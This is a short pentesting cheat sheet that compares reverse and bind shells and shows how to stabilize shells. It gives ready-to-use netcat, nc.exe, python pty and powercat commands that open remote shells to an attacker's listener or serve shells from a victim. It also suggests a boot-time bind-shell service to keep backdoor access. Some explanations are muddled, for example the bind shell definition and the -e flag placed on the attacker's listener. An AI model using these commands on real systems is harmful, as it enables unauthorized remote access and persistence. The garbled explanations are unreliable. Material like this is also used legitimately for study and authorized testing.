
## Reverse Shell VS Bind Shell

What use and when? Typically we use the bind shell in two scenarios. The first is the one in which we already have the access to the machine and we want a persistent access or a backdoor on it. In order to do that we could set a service that binds that port at every boot of the machine. The second scenario is the one in which we are not in the same internal network of the machine and we can't reach our machine from the victim because, for example, we are reaching the victim through web access and to obtain a reverse shell we likely have to enable port forwarding on the router of our networking. In this scenario a bind shell could let the attacker connect to the victim knowing only the external IP of the victim.

### Reverse Shell

Receiving a command line access to a remote machine, where the victim establish the connection to the attacker machine that is the listener.

Once the reverse shell payload is executed on the victim machine, on the attacker the listener will be

```shell
nc -lvnp 4444 -e /bin/bash
```

### Bind Shell

Receiving a command line access to a remote machine, where the victim establish the connection to the victim machine that is the listener.

Once the foothold is gained on the victim machine, It can be set up a listener that opens a shell at every connection. After the following connection is made, we can obtain a shell access on the victim machine. This command is run from the attacker.

```shell
nc <REMOTE-IP> 4444
```

## Shell Stabilization

Once we gain a shell, many times we don't have a fully interactive environment. We can use many tools to stabilize it.

### Netcat

From the kali machine we run the listener

```shell
nc -lvp <PORT>
```

From the Windows machine

```powershell
.\nc.exe <IP> <PORT> -e powershell
```

If we have a Linux machine

```powershell
.\nc.exe <IP> <PORT> -e bash
```

### Python3

Checking if the terminal is tty, otherwise spawn a tty with python3

```shell
tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Powercat

We can use Powercat to serve the shell on the listener

```shell
nc -lvp <PORT>
```

```powershell
powercat -l -p <PORT> -e cmd
```
